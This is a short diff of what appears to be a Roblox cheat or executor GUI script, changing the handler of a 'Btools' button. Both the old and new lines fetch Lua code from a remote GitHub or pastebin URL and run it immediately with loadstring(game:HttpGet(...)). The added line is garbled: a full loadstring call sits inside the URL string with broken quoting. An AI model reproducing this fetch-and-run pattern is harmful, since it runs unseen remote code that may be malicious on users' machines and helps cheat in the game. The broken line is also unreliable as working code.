@@ -47,7 +47,6 @@ ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 
-
 Frame.Parent = ScreenGui
 
 
@@ -586,7 +585,7 @@ local function LYTY_fake_script() -- Btools.Script
 	script.Parent.MouseButton1Down:Connect(function()
 
 
-		loadstring(game:HttpGet('https://raw.githubusercontent.com/ordenhub/ordenhub/main/OrdenHub.lua',true))()
+		loadstring(game:HttpGet('loadstring(game:HttpGet(('https://pastebin.com/raw/F5vSFHZt'),true))()',true))()
 
 
 	end)
